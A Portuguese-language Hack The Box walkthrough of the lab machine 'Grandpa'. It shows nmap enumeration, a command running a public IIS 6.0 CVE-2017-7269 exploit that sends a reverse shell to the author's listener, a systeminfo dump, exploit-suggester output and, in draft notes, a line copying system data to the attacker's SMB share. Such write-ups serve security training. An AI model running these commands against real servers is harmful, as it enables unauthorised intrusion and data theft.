---
title:     "Hack The Box - Grandpa"
tags: [windows,easy]
categories: HackTheBox
---

![1.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-grandpa/1.jpg)

## Discovery

Iniciamos entao nossa enumeracao usando o nmap

```
┌─[✗]─[htb-an4kein☺parrot]─[/htb/grandpa]
└──╼ $sudo nmap -Pn -p- -sV -oN nmap/allports_tcp 10.10.10.14
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-25 18:43 UTC
Stats: 0:01:48 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 95.31% done; ETC: 18:45 (0:00:05 remaining)
Nmap scan report for 10.10.10.14
Host is up (0.072s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Percebemos que existe apenas a porta 80 aberta, rodando uma servidor WEB na versao bem velha 

## Exploitation
Lembro que na maquina [Granny](https://an4kein.github.io/hackthebox/2020/06/24/HTB-Granny/)  explorei uma versao identica, logo vou testar o exploit usado nela pra tentar obter exito.. 

***preference*** https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell

Entao, executamos o exploit apos configurar nossa porta de preferencia para ficar escultando, eu escolhi a 53

`sudo python iis6-cve-2017-7269.py 10.10.10.14 80 10.10.14.36 53`

![2.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-grandpa/2.jpg)


## Privilege Escalation

Precisamo agora obter informacoes basicas do nosso alvo e assim continuar procurando um vetor de ataque para escalar o privilegio
Grupos, Permissoes, Arquiterura, Versao do sistema, etc.. sao informacoes necessarias para escalar.

![3.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-grandpa/3.jpg)

transfiro entao o output do `systeminfo` para meu localhost

![4.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-grandpa/4.jpg)

```

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 6 Hours, 55 Minutes, 17 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 787 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,313 MB
Page File: In Use:         157 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A

```

Agora, usamos o Windows-Exploit-Suggester

`sudo python windows-exploit-suggester.py --database 2020-06-25-mssb.xls --systeminfo /htb/grandpa/systeminfo.txt -l`


## Install python-xlrd

Tive problemas com o **python-xlrd**

![5.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-grandpa/5.jpg)

Resolvendo esse problema:

Faca o download no repo, link abaixo:
[Download](https://salsa.debian.org/python-team/modules/python-xlrd)

Depois de fazer o download eh necessario instalar extrair.

`sudo unzip python-xlrd-debian-master.zip`

Feito isso, instale os requimentos necessarios

`sudo pip install -r requirements.txt`

Em seguida use o `setup.py` para terminar a instacao

`sudo python setup.py install`

## Find Exploits (Windows-Exploit-Suggester)

Depois de ter configurado as dependencias podemos entao executar o `windows-exploit-suggester.py`

`sudo python windows-exploit-suggester.py --database 2020-06-25-mssb.xls --systeminfo /htb/grandpa/systeminfo.txt -l`

![6.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-grandpa/6.jpg)

```
initiating winsploit version 3.3...
database file detected as xls or xlsx based on extension
attempting to read from the systeminfo input file
systeminfo input file read successfully (ascii)
querying database file for potential vulnerabilities
comparing the 1 hotfix(es) against the 356 potential bulletins(s) with a database of 137 known exploits
there are now 356 remaining vulns
searching for local exploits only
[E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
windows version identified as 'Windows 2003 SP2 32-bit'

MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
  https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
  https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF

MS14-070: Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935) - Important
  http://www.exploit-db.com/exploits/35936/ -- Microsoft Windows Server 2003 SP2 - Privilege Escalation, PoC

MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
  http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC

MS14-062: Vulnerability in Message Queuing Service Could Allow Elevation of Privilege (2993254) - Important
  http://www.exploit-db.com/exploits/34112/ -- Microsoft Windows XP SP3 MQAC.sys - Arbitrary Write Privilege Escalation, PoC
  http://www.exploit-db.com/exploits/34982/ -- Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation

MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
  https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
  https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC

MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
  http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC

MS14-002: Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368) - Important
MS11-080: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2592799) - Important
MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Elevation of Privilege (970483) - Important
done
```



## Rascunho

```
systeminfo >> \\10.10.14.36\tools\systeminfo.txt
sudo python /opt/impacket/examples/smbserver.py tools .
```
